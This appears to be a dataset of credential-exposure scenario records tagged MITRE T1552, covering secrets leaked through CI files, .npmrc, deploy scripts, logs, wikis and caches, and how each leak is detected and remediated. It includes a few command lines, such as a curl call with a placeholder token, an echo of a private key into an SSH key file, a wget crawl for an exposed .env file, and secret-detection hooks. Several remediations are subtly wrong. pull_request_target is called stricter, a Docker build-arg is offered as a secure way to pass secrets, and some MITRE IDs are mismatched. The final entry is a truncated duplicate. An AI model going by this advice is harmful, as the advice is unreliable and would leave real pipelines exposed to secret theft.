- **Attack Type**: Misconfigured CI Variables
- **Target**: GitLab Pipeline
- **Vulnerability**: Secrets stored in YAML CI files
- **MITRE**: T1552.001
- **Impact**: Registry compromise, service sabotage
- **Tools**: GitLab CI
- **Scenario**: Sensitive token added directly in .gitlab-ci.yml file instead of GitLab secret variable vault.
- **Attack Steps**: 1. A developer configures a GitLab CI job to deploy Docker containers using a private Docker Hub account.2. Instead of using GitLab's protected variables feature, the DOCKER_TOKEN is placed directly into the .gitlab-ci.yml file.3. The file is committed and pushed to the project.4. Although the repo is private, several contributors have clone and push access.5. One contributor accidentally leaks the .gitlab-ci.yml file when troubleshooting deployment and pastes it into a public forum.6. The token is misused to delete Docker images and push malicious ones under the same image tag.7. GitLab’s internal scanning eventually detects the secret during an audit.8. Post-incident, protected CI variables are enforced by default, and .gitlab-ci.yml undergoes additional review.9. GitLab CI linting is extended to include pattern checks for inline secrets.10. Role-based access control (RBAC) is tightened to reduce who can view sensitive config files.
- **Detection**: GitLab Linter + Secret Detection
- **Solution**: Use secret vaults in CI/CD configs
- **Tags**: #gitlabci #inlinecredential #dockertoken

## .npmrc with Auth Token Pushed to Monorepo

- **Attack Type**: Package Manager Token Leak
- **Target**: Monorepo
- **Vulnerability**: Auth token in package manager file
- **MITRE**: T1552.001
- **Impact**: Registry access abuse
- **Tools**: npm, GitHub
- **Scenario**: An .npmrc file containing a token is mistakenly committed into a monorepo used by many teams.
- **Attack Steps**: 1. A developer working on an internal JavaScript package manager copies their .npmrc file into the repo to share config.2. This file contains the line _authToken=ghp_abc123..., granting access to private GitHub packages.3. The .npmrc file is pushed to the monorepo, which has dozens of developers working on multiple packages.4. Several forks and CI/CD builds include the file and expose it in logs.5. GitHub Secret Scanning detects the token and sends an alert.6. The token is revoked, and the developer is reminded to use environment variables for such configs.7. A .gitignore rule is added to prevent committing .npmrc.8. All forks are scanned for the same file.9. The team adds detect-secrets to pre-commit to block committing .npmrc or .pypirc.10. Documentation is updated to teach package configuration without storing auth tokens in code.
- **Detection**: GitHub Secret Scanning + Fork Review
- **Solution**: Prevent sensitive config files in VCS
- **Tags**: #npmrc #tokenleak #monorepo

## SSH Private Key Added in Deployment Script

- **Attack Type**: Deployment Key Exposure
- **Target**: Bash Scripts
- **Vulnerability**: SSH key stored in script
- **MITRE**: T1552.004
- **Impact**: Remote access and shell compromise
- **Tools**: Bash, GitHub
- **Scenario**: SSH private key used for server access is hardcoded in deploy.sh.
- **Attack Steps**: 1. A developer writes a bash deployment script deploy.sh that automates SCP-based deployment to a production server.2. They include a private RSA key inline in the script using echo '<key>' > ~/.ssh/id_rsa for convenience.3. The script is committed to the repo and pushed.4. Another developer discovers the issue and raises a red flag.5. GitHub Secret Scanning also flags the private key and notifies the org security team.6. Meanwhile, logs on the production server indicate successful login attempts from unknown IPs.7. The private key is invalidated, and the server SSH configuration is hardened to reject passwordless root access.8. The deployment process is migrated to use GitHub Deploy Keys and CI/CD vaults.9. Developers are trained to never store private credentials inline and use .ssh/config securely.10. The team installs Gitleaks pre-commit hook to block private keys using regex patterns.
- **Detection**: GitHub Scanning + Syslog
- **Solution**: Never include private keys in scripts
- **Tags**: #sshkey #deployment #scriptsecrets

## Jenkins Job Stores AWS Keys in Console Output

- **Attack Type**: Jenkins Console Leakage
- **Target**: Jenkins
- **Vulnerability**: Secrets in job output
- **MITRE**: T1552.001
- **Impact**: Internal leak of cloud credentials
- **Tools**: Jenkins, AWS
- **Scenario**: Sensitive secrets are printed to Jenkins job console and remain visible to all Jenkins users.
- **Attack Steps**: 1. A Jenkins pipeline is configured to use AWS CLI with access keys passed via credentials.2. During job execution, an echo command prints AWS_ACCESS_KEY_ID for debug purposes.3. The full key is printed into the Jenkins console output, which is viewable by anyone with job access.4. The credentials are harvested by another user inspecting a past job.5. CloudTrail logs show usage of the key from new locations.6. Jenkins security policy is updated to mask all environment variables starting with AWS_.7. Post-job cleanup is introduced to redact old logs or make them admin-only.8. Jenkins global pipeline config is updated to deny use of echo $AWS_... style commands.9. Credentials are migrated to AWS IAM roles with short-lived tokens.10. Access to Jenkins is reviewed and hardened.
- **Detection**: Jenkins Console Logs
- **Solution**: Mask environment secrets in Jenkins
- **Tags**: #jenkins #aws #consoleleak

## Mobile App Reverse-Engineered for Firebase Key

- **Attack Type**: Mobile Key Leak
- **Target**: Android APK
- **Vulnerability**: Firebase key in mobile binary
- **MITRE**: T1552.001
- **Impact**: Mobile API misuse and data exfil
- **Tools**: apktool, JADX
- **Scenario**: Firebase secret key hardcoded in Android app and extracted via decompilation.
- **Attack Steps**: 1. A developer includes Firebase project credentials in google-services.json in the Android app.2. This config is included in the production APK and published to the Play Store.3. An attacker downloads the APK and uses apktool and jadx to reverse-engineer the app.4. They find the Firebase key and access backend services without authentication.5. Abuse logs indicate mass reads and writes to the Firebase database.6. Firebase rules are hardened to require auth != null for all access.7. Keys are regenerated, and sensitive features are restricted server-side.8. Developers are trained to never trust frontend for secret storage.9. All mobile keys are stored on secure backend and retrieved using token-based APIs.10. Firebase monitoring is configured to detect high read/write anomalies.
- **Detection**: Firebase Audit + App Review
- **Solution**: Secure mobile APIs with backend auth
- **Tags**: #firebase #mobileapp #keyleak

## Secret Shared in GitHub Issue for Debugging

- **Attack Type**: Issue Tracker Exposure
- **Target**: GitHub Issues
- **Vulnerability**: Secrets in support messages
- **MITRE**: T1552.001
- **Impact**: Unauthorized access to APIs
- **Tools**: GitHub Issues
- **Scenario**: Developer pastes token into public GitHub Issue while debugging an auth error.
- **Attack Steps**: 1. A developer faces an API error during CI and opens a GitHub Issue on the repo.2. To seek help, they paste the full curl command including Authorization: Bearer ... in plaintext.3. The repo is public and the issue is immediately visible.4. A bot or user copies the token and uses it before it's revoked.5. GitHub Secret Scanning flags the issue and emails the org admin.6. The issue is edited, token revoked, and additional review policies are put in place.7. A custom bot is developed to redact secrets from issues and pull requests.8. Developers are trained to only post redacted logs or use internal issue trackers.9. Organization enables GitHub's token filtering API for issues.10. Retrospective scan of all open Issues for similar mistakes is performed.
- **Detection**: GitHub Secret Scanning
- **Solution**: Use redaction bots on public issues
- **Tags**: #issuetracker #support #tokenexposure

## Private Key Accidentally Committed in .pem File

- **Attack Type**: Certificate Leakage
- **Target**: Git Repo
- **Vulnerability**: SSL private key in commit
- **MITRE**: T1552.004
- **Impact**: Certificate misuse and MITM risk
- **Tools**: Git, OpenSSL
- **Scenario**: SSL/TLS .pem private key is committed to a Git repo and exposed in history.
- **Attack Steps**: 1. A developer generates a new SSL certificate using openssl and stores the .pem file locally.2. They later add it to the project directory by mistake and commit it.3. The file is included in multiple commits, merged into the main branch, and pushed.4. GitHub Secret Scanning flags the file, but attackers may have already pulled the repo.5. The certificate is revoked and replaced with a newly generated key.6. Git history is purged using BFG Repo Cleaner.7. .pem files are banned via .gitignore and CI commit hooks.8. Developers are trained to manage SSL keys using tools like Let's Encrypt with secure permission controls.9. The CI/CD pipeline is updated to block pushes that include .pem or .key extensions.10. A retrospective review of Git history is conducted using trufflehog to ensure no residual exposures.
- **Detection**: GitHub Secret Scanning
- **Solution**: Ban private key extensions in code repos
- **Tags**: #pemleak #sslkey #gitmisuse

## Token Found in GitHub Wiki Page Revision

- **Attack Type**: Documentation Leak
- **Target**: GitHub Wiki
- **Vulnerability**: Token in documentation history
- **MITRE**: T1552.001
- **Impact**: Access to protected APIs
- **Tools**: GitHub Wiki
- **Scenario**: A GitHub Wiki page contains an access token accidentally included in a commit.
- **Attack Steps**: 1. While documenting API usage, a developer pastes real API token in a markdown code block.2. The wiki page is pushed and available in the repo’s wiki history.3. Later edits remove the token, but Git history retains the leaked version.4. GitHub Advanced Security detects it and disables the token.5. Attackers who cloned the wiki earlier can still access the leaked token.6. History is purged, wiki access restricted, and token rotated.7. Post-incident, a policy is set that wiki commits are also scanned.8. A separate private internal documentation platform is used.9. Developers are trained to avoid live tokens in markdown.10. Wiki version control is migrated to a monitored Git repo with linting.
- **Detection**: GitHub Secret Scanning
- **Solution**: Scan wiki history + restrict edits
- **Tags**: #wikipage #tokeninmarkdown #apileak

## Jenkinsfile Leaks AWS Access Keys During Merge Conflict

- **Attack Type**: Version Control Oversight
- **Target**: Jenkins Pipeline
- **Vulnerability**: Merge conflict exposing secrets
- **MITRE**: T1552.001
- **Impact**: Unauthorized access to AWS resources
- **Tools**: Git, Jenkins
- **Scenario**: AWS credentials exposed in unresolved merge conflict in a Jenkinsfile pushed to repo.
- **Attack Steps**: 1. Two developers make changes to the same Jenkinsfile on separate branches — one adds a hardcoded AWS access key for testing, the other adjusts a stage name.2. During the merge, the developer doesn't properly resolve the conflict, leaving both versions separated by conflict markers (<<<<<<<, =======, >>>>>>>).3. The combined file, including the live AWS key, is committed and pushed to the main branch.4. Jenkins executes the pipeline using the merged file, but also logs a warning due to syntax issues.5. GitHub Secret Scanning detects the leaked key and sends a notification.6. CloudTrail logs confirm the key was used from a non-company IP address shortly after commit.7. The key is immediately revoked.8. Postmortem identifies lack of awareness around merge conflict cleanup.9. Git hooks and pre-commit scripts are introduced to block unresolved conflict markers.10. Secrets are moved to GitHub Actions secrets or Jenkins credentials vaults, and merge conflicts in CI files now require peer review.
- **Detection**: GitHub Secret Scanning + Git Diff Checks
- **Solution**: Add pre-commit hooks to block unresolved conflicts
- **Tags**: #jenkinsfile #mergeconflict #awskeys

## GitHub Codespace Terminal Displays PAT in History

- **Attack Type**: Terminal History Exposure
- **Target**: GitHub Codespace
- **Vulnerability**: Secrets exposed via terminal history
- **MITRE**: T1552.003
- **Impact**: Internal token misuse risk
- **Tools**: GitHub Codespaces
- **Scenario**: Developer uses curl with token in Codespace terminal; value gets stored in .bash_history.
- **Attack Steps**: 1. A developer testing GitHub API behavior inside a Codespace executes curl -H "Authorization: token ghp_abc123..." https://api.github.com/user.2. This command is stored in the .bash_history file within the Codespace’s Linux environment.3. The Codespace is shared with another internal user for collaborative debugging.4. The second user runs history to view prior commands and discovers the token.5. The token is still active and could be used to modify repositories or CI/CD settings.6. GitHub Secret Scanning doesn't catch this as the .bash_history is not committed to the repo.7. The token is eventually misused to create a rogue GitHub Action in another repo.8. Admin disables the token and introduces session auto-cleanups for terminal history.9. Codespaces configuration files are updated with login scripts that purge shell history.10. Developers are trained to use authenticated CLI tools (gh auth login) instead of direct tokens.
- **Detection**: Manual session inspection
- **Solution**: Clear terminal history and restrict sharing
- **Tags**: #codespaces #bashhistory #patleak

## GitHub Pages Site Contains Backup .env File

- **Attack Type**: Web-Based Secret Exposure
- **Target**: GitHub Pages
- **Vulnerability**: Secret file accessible via URL
- **MITRE**: T1552.001
- **Impact**: Public exposure of private credentials
- **Tools**: GitHub Pages, wget
- **Scenario**: A mistakenly uploaded .env file on GitHub Pages site leaks Firebase and API keys.
- **Attack Steps**: 1. A developer builds a static site and pushes the /build directory to gh-pages branch for GitHub Pages hosting.2. Due to incorrect .gitignore, a .env.backup file containing secrets is included in the build.3. The site is deployed, and anyone with the URL example.com/.env.backup can access the file.4. A bug bounty hunter finds the file using wget --mirror to crawl the site.5. Secrets include Firebase config and SendGrid API key, which are immediately exploited for spam.6. GitHub Advanced Security alerts after detecting the .env content.7. The site is pulled down and all credentials are revoked.8. Build scripts are updated to ignore .env* files.9. Developers are instructed to build to a clean dist/ directory before pushing.10. A file integrity scanner is added to deployment CI to block unsafe files.
- **Detection**: Web crawling + GitHub Secret Scanning
- **Solution**: Use clean build process and strict ignores
- **Tags**: #githubpages #envleak #staticweb

## AWS Lambda Function Logs Credentials to CloudWatch

- **Attack Type**: Misconfigured Logging
- **Target**: AWS Lambda
- **Vulnerability**: Secrets in cloud logs
- **MITRE**: T1552.001
- **Impact**: Internal exposure via log monitoring tools
- **Tools**: AWS Lambda, CloudWatch
- **Scenario**: Lambda function accidentally logs secrets that are indexed by CloudWatch.
- **Attack Steps**: 1. A Lambda function is deployed that reads an S3 bucket using credentials injected as environment variables.2. During testing, the developer logs a debug line console.log("S3 Key: " + process.env.AWS_SECRET_ACCESS_KEY).3. This log is recorded in CloudWatch logs and remains there indefinitely unless retention is configured.4. Another team with CloudWatch access later exports logs for analysis and discovers the key.5. Before rotation, someone outside the team accesses resources using that key from another IP.6. AWS GuardDuty flags the activity.7. The secret is revoked immediately and CloudWatch logs purged manually.8. Logging configuration is updated to exclude environment variables and use redaction where possible.9. IAM permissions to CloudWatch are reviewed to follow least privilege.10. CI pipeline includes static analysis to warn if console.log includes env variables.
- **Detection**: CloudWatch Logs + GuardDuty
- **Solution**: Avoid logging sensitive variables
- **Tags**: #cloudwatch #lambda #awslogleak

## Git Submodule References Contain Leaked Secrets

- **Attack Type**: Submodule Exposure
- **Target**: Git Submodules
- **Vulnerability**: Secrets leak through shared code
- **MITRE**: T1552.001
- **Impact**: Cross-repo credential exposure
- **Tools**: Git, GitHub
- **Scenario**: A developer adds a Git submodule containing secrets from another internal repo.
- **Attack Steps**: 1. A developer adds a submodule to reuse an internal tool stored in a private repo.2. The submodule directory includes a .env file and a credentials.txt, both committed previously by another team.3. When the submodule is initialized and committed to the main project, these files are brought along.4. The main project is pushed to GitHub and eventually made public.5. Now, anyone who clones the project and runs git submodule update --init fetches the secrets too.6. GitHub Secret Scanning flags the credentials.7. A hotfix removes the submodule, and affected repos revoke credentials.8. Policies are introduced to never include submodules unless reviewed and scrubbed.9. Repo scanning tools like trufflehog are integrated to check submodule history.10. .gitsubmodules config is locked to specific safe paths.
- **Detection**: GitHub Secret Scanning + trufflehog
- **Solution**: Review all submodule contents carefully
- **Tags**: #submodules #envfile #credentialleak

## Secret Exposed in GitHub Copilot Generated Snippet

- **Attack Type**: AI Code Suggestion Leak
- **Target**: GitHub Copilot
- **Vulnerability**: AI-generated token from prior training
- **MITRE**: T1565.002
- **Impact**: Use of real tokens in AI-suggested code
- **Tools**: GitHub Copilot
- **Scenario**: Copilot suggests a real token it learned from public repos into live code.
- **Attack Steps**: 1. A developer uses GitHub Copilot in VSCode while working on a function to send messages to Discord.2. Copilot autocompletes with a webhook_url that appears to be valid.3. The developer pastes it into the app and successfully sends test messages.4. Unaware of the implications, they commit the code including the suggested token.5. GitHub Secret Scanning detects the Discord webhook after push.6. Investigation reveals the token was likely learned from an indexed public repo.7. The webhook is revoked and replaced with a new one.8. GitHub retrains Copilot to remove known secrets from suggestions.9. Developers are warned not to trust autocomplete-generated secrets.10. A manual code review is required if Copilot suggestions resemble sensitive data.
- **Detection**: GitHub Scanning + Copilot Feedback
- **Solution**: Educate users on Copilot security hygiene
- **Tags**: #copilot #aisecurity #tokenreuse

## Google Cloud Function Logs API Key in Stack Trace

- **Attack Type**: Stack Trace Leakage
- **Target**: Google Cloud Logs
- **Vulnerability**: Secrets in crash logs
- **MITRE**: T1552.001
- **Impact**: API key exfiltration via logs
- **Tools**: GCP Logs, GCF
- **Scenario**: API key passed via request is logged in stack trace when error occurs.
- **Attack Steps**: 1. A Google Cloud Function is triggered via HTTP request with an API key in the query string.2. The function crashes due to a runtime error.3. GCP automatically logs the entire request including query parameters into Stackdriver logs.4. These logs are retained and searchable by any project member with viewer permissions.5. The API key is later found by another developer auditing logs.6. Before revocation, malicious activity is detected using the key.7. The team rewrites the function to use headers instead of query strings for secret parameters.8. GCP log redaction is configured to scrub sensitive data in all stack traces.9. GCP IAM roles are tightened and logging is scoped by service.10. All exposed keys are rotated and backend enforces token validation via IP whitelist.
- **Detection**: Stackdriver + Error Monitoring
- **Solution**: Sanitize logs and move secrets to headers
- **Tags**: #gcf #stacktrace #logleak

## GitHub Discussions Used to Post Secrets for Debugging

- **Attack Type**: Community Channel Leak
- **Target**: GitHub Discussions
- **Vulnerability**: Secrets in public developer forums
- **MITRE**: T1552.001
- **Impact**: Public exploitation of tokens
- **Tools**: GitHub Discussions
- **Scenario**: Developer asks for help in GitHub Discussions and posts full auth token in the thread.
- **Attack Steps**: 1. A junior engineer encounters an auth failure using a third-party API in a GitHub Action.2. To seek help, they post the failing request, including a valid Bearer token, into the GitHub Discussions page.3. The token is immediately accessible publicly.4. Within 10 minutes, the token is used to send malicious requests.5. GitHub Advanced Security flags the token shortly after.6. The issue is escalated to the org security team.7. The discussion is deleted, token revoked, and an incident analysis begins.8. Guidelines are published restricting use of GitHub Discussions for debugging tokens.9. The team implements a "redaction bot" that warns users if secrets are included.10. Internal forums are promoted for debugging sensitive workflows.
- **Detection**: GitHub Advanced Security
- **Solution**: Warn users against pasting secrets online
- **Tags**: #discussions #tokenleak #debuggingmistake

## Exposed Secret in VSCode Workspace Settings

- **Attack Type**: IDE Config Leakage
- **Target**: VSCode Workspace
- **Vulnerability**: Secrets in IDE settings files
- **MITRE**: T1552.001
- **Impact**: Accidental team-wide token leak
- **Tools**: VSCode, GitHub
- **Scenario**: Workspace file .code-workspace pushed with hardcoded secret used for debugging.
- **Attack Steps**: 1. A developer stores a test secret in .vscode/settings.json inside a custom .code-workspace file.2. This file is committed to the repo and pushed, exposing the token.3. Since the .vscode/ directory isn’t in .gitignore, it gets shared with the team.4. GitHub Secret Scanning flags the token post-push.5. Incident response confirms token was active and misused.6. Workspace settings are stripped and replaced with secure configs.7. .vscode is added to .gitignore, and workspace settings are moved to non-repo storage.8. Pre-commit hook flags secrets inside any settings.json or .code-workspace files.9. Developers are trained to separate local IDE config from source.10. Secret scanning patterns are tuned to include common IDE files.
- **Detection**: GitHub Secret Scanning
- **Solution**: Use .gitignore for IDE configs
- **Tags**: #vscode #ideleak #settingsjson

## GitHub Actions Cache Stores Secret File

- **Attack Type**: Caching Misuse
- **Target**: GitHub Actions
- **Vulnerability**: Cache exposing secret files
- **MITRE**: T1552.001
- **Impact**: Secret exposure via PR workflows
- **Tools**: GitHub Actions Cache
- **Scenario**: Cache artifact contains .env file with secrets, accessible to forked PRs.
- **Attack Steps**: 1. A GitHub Action job caches dependencies and workspace files using actions/cache.2. The path includes .env, which holds production secrets accidentally stored during build.3. A forked PR triggers the workflow and reuses the cache, gaining access to the .env file.4. The PR author runs a job that prints cache contents, extracting the secrets.5. GitHub doesn't isolate caches per branch unless configured to do so.6. The secret is revoked and workflows updated.7. Cache key strategy is hardened to exclude .env.8. Forked PRs now use pull_request_target with stricter permission models.9. Developers are warned against caching sensitive paths.10. Secure workspace cleanup scripts are added at the end of each job.
- **Detection**: GitHub Logs + Action Debug
- **Solution**: Never cache files with secrets
- **Tags**: #ghactions #cacheleak #envfile

## Exposed AWS Key Replaced with Rotated Secret via AWS Secrets Manager

- **Attack Type**: Secrets Rotation (AWS)
- **Target**: AWS IAM & GitHub
- **Vulnerability**: Hardcoded secrets in public repo
- **MITRE**: T1552.001
- **Impact**: Prevents key compromise through automated rotation
- **Tools**: AWS Secrets Manager, GitHub, Lambda
- **Scenario**: Upon detection of hardcoded AWS credentials, system triggers automatic secret rotation through AWS Secrets Manager.
- **Attack Steps**: 1. A developer accidentally commits an AWS access key and secret to a public GitHub repository.2. GitHub Advanced Security triggers a secret scanning alert within minutes of the push.3. An AWS Lambda function, subscribed to SNS alerts, identifies the key from GitHub's webhook and rotates the key using the AWS Secrets Manager API.4. The IAM user’s old key is disabled and a new one is issued with the same permissions.5. The updated key is injected into all runtime environments using parameter store integration and auto-reload.6. DevSecOps team reviews CloudTrail logs to verify no misuse happened during the key’s exposure window.7. Secrets Manager versioning ensures rollback in case rotation breaks downstream systems.8. Alert response time, auto-rotation logic, and AWS permissions are reviewed during post-incident.9. Future pushes to main branch are blocked if secrets are detected using pre-commit hooks.10. Developers are trained to use aws-vault or short-lived credentials only.
- **Detection**: GitHub Advanced Security + AWS SNS trigger
- **Solution**: Enforce secret scanning + automated rotation
- **Tags**: #aws #secretsmanager #rotation #gitleak

## Dynamic Database Password Injection Using HashiCorp Vault in CI

- **Attack Type**: Secrets Injection at Runtime
- **Target**: CI/CD Pipeline
- **Vulnerability**: Static secrets removed from code
- **MITRE**: T1552.004
- **Impact**: Runtime injection prevents static leak
- **Tools**: HashiCorp Vault, Jenkins, Ansible
- **Scenario**: Hardcoded DB passwords replaced by Vault-injected credentials at CI runtime.
- **Attack Steps**: 1. CI pipeline in Jenkins previously used a static .env file containing MySQL credentials to deploy a backend service.2. Secrets are removed from the repo and instead fetched dynamically from HashiCorp Vault during job runtime using Jenkins credentials binding plugin.3. Jenkins authenticates to Vault using a role and retrieves secrets via the Vault HTTP API (vault read secret/db/mysql).4. The password is exported to the pipeline stage and never stored on disk.5. After usage, Vault revokes the short-lived token, ensuring no credential reuse.6. Rotation policies ensure that DB credentials expire every 24 hours.7. Developers are prevented from viewing the secrets via Jenkins masking or permission scopes.8. Any attempt to access the secret from the Jenkins UI triggers an audit log entry.9. Monitoring tools check for unauthorized access patterns or credential re-use.10. Compliance team verifies that the change complies with least privilege and auditability requirements.
- **Detection**: Vault Audit Logs + Jenkins API logs
- **Solution**: Replace static secrets with dynamic Vault injection
- **Tags**: #vault #jenkins #mysql #runtimeinjection

## Git Hook Blocks Push of Hardcoded Azure Key

- **Attack Type**: Pre-Commit Hook Secret Detection
- **Target**: Git Repository
- **Vulnerability**: Hardcoded Azure token
- **MITRE**: T1552.001
- **Impact**: Prevents token from reaching repo
- **Tools**: Husky, detect-secrets
- **Scenario**: Husky hook detects and blocks Azure token before it reaches the repo.
- **Attack Steps**: 1. A developer accidentally pastes an Azure AD token into config.js for testing.2. A Husky-managed pre-commit hook runs detect-secrets scan and flags the token pattern using regexes for Azure tokens.3. The commit is blocked and the error message shows the exact line containing the secret.4. The developer removes the token and refactors the code to use a Vault-stored reference.5. Team lead receives Slack notification via CI webhook about blocked secrets (optional config).6. CI/CD won’t run without passing the commit gate.7. A .pre-commit-config.yaml file standardizes hook rules across team members.8. The team rotates the token in Azure just in case the secret was ever copied elsewhere.9. GitHub repo uses branch protections, ensuring pre-commit compliance for all merges.10. All new developers clone the repo with hook setup instructions enforced via post-checkout script.
- **Detection**: Pre-commit hook output + local logs
- **Solution**: Block commits containing secrets via Git hooks
- **Tags**: #husky #precommit #azuretoken

## PR Review Policy Blocks Unsafe Dockerfile Edit

- **Attack Type**: PR Review Enforcement
- **Target**: GitHub Pull Requests
- **Vulnerability**: Insecure Dockerfile environment variables
- **MITRE**: T1552.001
- **Impact**: Stops unsafe image builds with secrets
- **Tools**: GitHub, branch protection rules
- **Scenario**: PR reviewer blocks addition of plaintext secret into Dockerfile ENV.
- **Attack Steps**: 1. A contributor submits a pull request adding a Dockerfile with ENV API_KEY=abc123.2. GitHub repo uses a branch protection rule requiring at least one code reviewer for .github/workflows/** and Dockerfile changes.3. Reviewer flags the secret in the PR and requests removal.4. GitHub blocks the merge until a review is approved.5. Contributor refactors the Dockerfile to read API_KEY from a mounted secret via Docker --build-arg.6. PR is updated and passes the security review.7. The security team adds an additional GitHub Action that automatically scans for hardcoded secrets in Dockerfiles.8. Review guidelines are updated to prioritize checks for ENV variables with sensitive values.9. GitHub Advanced Security also scans the PR and sends a policy alert to org admins.10. The team logs all PR interactions in a compliance dashboard for audit tracking.
- **Detection**: GitHub PR workflow logs
- **Solution**: Use PR review rules and linting bots
- **Tags**: #prreview #dockerfile #secretdetection

## Dynamic Vault Credentials for Kubernetes Deployment

- **Attack Type**: Secrets Rotation in K8s
- **Target**: Kubernetes Cluster
- **Vulnerability**: Static Kubernetes secrets
- **MITRE**: T1552.004
- **Impact**: Ephemeral secrets reduce attack window
- **Tools**: HashiCorp Vault, kubectl, ArgoCD
- **Scenario**: CI deploys Kubernetes app using ephemeral Vault credentials.
- **Attack Steps**: 1. A CI/CD pipeline triggers deployment of a Go app to Kubernetes using ArgoCD.2. Instead of static secrets.yaml, the pipeline uses Vault Agent Injector.3. During deployment, Vault authenticates the Kubernetes ServiceAccount using a Vault role.4. It injects a vault.sidecar container that pulls and mounts secrets at runtime.5. The main app reads credentials from shared memory or mounted volume.6. Secrets rotate every 2 hours, minimizing lifetime risk.7. Vault audit logs record secret access and service identity mappings.8. If sidecar injection fails, the pod startup is aborted, reducing partial deployments.9. The dev team no longer requires .env files in CI artifacts.10. ArgoCD validates that all secrets come from Vault during pre-sync hooks.
- **Detection**: Vault audit logs + ArgoCD sync status
- **Solution**: Inject short-lived secrets via Vault Agent
- **Tags**: #vault #k8s #ephemeralsecrets

## Git Hook Prevents Accidental SSH Key Commit

- **Attack Type**: Pre-Commit Hook Blocking
- **Target**: Developer Workstation
- **Vulnerability**: Accidental commit of SSH private key
- **MITRE**: T1552.001
- **Impact**: Prevents credential leak to repo
- **Tools**: pre-commit, regex, Git
- **Scenario**: Regex pattern in hook blocks .pem and .ssh files from being committed.
- **Attack Steps**: 1. A developer copies a private SSH key id_rsa to a project directory for testing GitOps.2. The key is staged and added to commit.3. A custom pre-commit hook runs and checks file extensions and content entropy.4. It flags the SSH private key and prevents the commit with a custom message.5. Hook also logs the incident to a local file with a timestamp.6. Developer rotates the SSH key and removes the file.7. The team applies a .gitignore policy to exclude .ssh, .pem, and .key files globally.8. A post-commit hook sends alert to Slack if a secret ever bypasses the hook.9. Developers are trained to use SSH agent forwarding instead of key files.10. All sensitive directories are audited monthly with Git-secrets.
- **Detection**: Hook logs + commit block output
- **Solution**: Add hooks and rotate compromised SSH keys
- **Tags**: #sshkey #gitsecrets #precommithook

## CI Secrets Removed From History Using Git Filter-Repo

- **Attack Type**: Historical Secret Cleanup
- **Target**: GitHub / GitLab
- **Vulnerability**: Legacy secrets in commit history
- **MITRE**: T1552.001
- **Impact**: Cleans historical leakage of secrets
- **Tools**: Git filter-repo, BFG Repo Cleaner
- **Scenario**: Legacy commits purged of secrets using Git filter-repo.
- **Attack Steps**: 1. A security audit finds an old Git commit from 2021 containing a service_account.json with GCP credentials.2. Git history is scanned using trufflehog and confirmed to expose valid keys.3. Team uses git filter-repo to rewrite history and remove the file across all branches and tags.4. Force-push is executed with coordination to prevent downstream clone failures.5. GitHub Advanced Security is re-run to verify the history is clean.6. The GCP keys are rotated and IAM logs reviewed.7. pre-receive hooks are set up to reject commits with *.json containing high entropy strings.8. Project documentation is updated to include guidelines for secret removal.9. All contributors are required to re-clone or reset origin HEAD.10. Internal Git servers enable commit validation for .json, .env, .pem.
- **Detection**: GitHub scans + trufflehog
- **Solution**: Rewrite repo history and rotate credentials
- **Tags**: #gitfilter #historyclean #secretrotation

## Vault Rotation Policy Enforces 15-Minute DB Credential Expiry

- **Attack Type**: Short-Lived Secrets Policy
- **Target**: Database Access in CI
- **Vulnerability**: Long-lived credentials
- **MITRE**: T1552.004
- **Impact**: Limits blast radius of credential misuse
- **Tools**: HashiCorp Vault, PostgreSQL
- **Scenario**: Enforce aggressive expiration on secrets using Vault dynamic creds.
- **Attack Steps**: 1. Vault is configured to issue dynamic PostgreSQL credentials using a role-based plugin.2. A TTL policy is set to expire all credentials in 15 minutes.3. A CI/CD pipeline fetches the creds at job start, uses them to run migrations, and then discards them.4. Vault revokes the lease automatically, ensuring credentials cannot be reused.5. Attempts to reuse the revoked credentials fail with a 403 error.6. Vault logs are monitored to track access frequency and IP behavior.7. Devs are instructed never to store the credentials outside CI job memory.8. Pipelines fail-fast if Vault access fails, enforcing secrets are always fresh.9. Access control on the Vault role ensures least-privilege principle.10. Post-rotation alerts are generated and integrated into Slack or Teams.
- **Detection**: Vault access logs + TTL metrics
- **Solution**: Use dynamic secrets with short TTL
- **Tags**: #postgres #vaultttl #rotatingcreds

## PR Merge Blocked Due to Unreviewed GitHub Actions File

- **Attack Type**: PR Review Enforcement
- **Target**: GitHub Actions
- **Vulnerability**: CI security enforcement via reviews
- **MITRE**: T1556.006
- **Impact**: Prevents misuse of CI pipeline by malicious PR
- **Tools**: GitHub Branch Protection
- **Scenario**: Merge blocked until CI config change is approved by senior reviewer.
- **Attack Steps**: 1. A developer modifies .github/workflows/deploy.yml to include a new deployment step.2. A branch protection rule requires that any CI-related files receive approval from a designated reviewer group (ci-leads).3. The PR is auto-flagged and shown as “Pending Review.”4. Reviewer inspects the script and identifies a possible misuse of GITHUB_TOKEN scope.5. The developer adjusts the token permissions to read-only for security.6. After changes are approved, the PR passes checks and merges.7. Logs of the PR, review comments, and status checks are archived.8. This protection ensures no CI file is altered without oversight.9. GitHub REST API is used to monitor workflow file changes across repos.10. Changes are auto-notified to security team Slack channel.
- **Detection**: Branch protection logs
- **Solution**: Require reviewers for CI config files
- **Tags**: #githubactions #reviewrequired #prsecurity

## Secrets Stored in SOPS-Encrypted File with Automatic Decryption in CI

- **Attack Type**: Secrets at Rest Security
- **Target**: GitHub Actions / CI
- **Vulnerability**: Secret file encryption and access control
- **MITRE**: T1552.001
- **Impact**: Protects secrets in repo while enabling CI use
- **Tools**: SOPS, GPG, GitHub Actions
- **Scenario**: Secrets committed in encrypted YAML, decrypted at runtime.
- **Attack Steps**: 1. Instead of storing secrets in plain .env or YAML files, team encrypts them with Mozilla SOPS and commits the encrypted files (secrets.enc.yaml).2. GitHub Actions retrieves GPG key securely from a Vault.3. During job runtime, sops -d is run to decrypt secrets into memory only.4. Application reads the secrets from environment variables, not from disk.5. Post-job step wipes memory and sensitive files.6. Pre-commit hook ensures no unencrypted secrets.yaml is ever committed.7. Reviewers verify that secrets files are encrypted properly in each PR.8. All GPG key accesses are audited.9. The secrets are rotated monthly and re-encrypted with fresh keys.10. CI failure triggers if SOPS decryption fails, preventing unsafe deployments.
- **Detection**: Decryption audit logs + pre-commit
- **Solution**: Use SOPS for encrypted secrets in Git
- **Tags**: #sops #gpg #encryptedyaml

## Exposed AWS Key Replaced with Rotated Secret via AWS Secrets Manager

- **Attack Type**: Secrets Rotation (AWS)
- **Target**: AWS IAM & GitHub
- **Vulnerability**: Hardcoded secrets in public repo
- **MITRE**: T1552.001
- **Impact**: Prevents key compromise through automated rotation
- **Tools**: AWS Secrets Manager, GitHub, Lambda
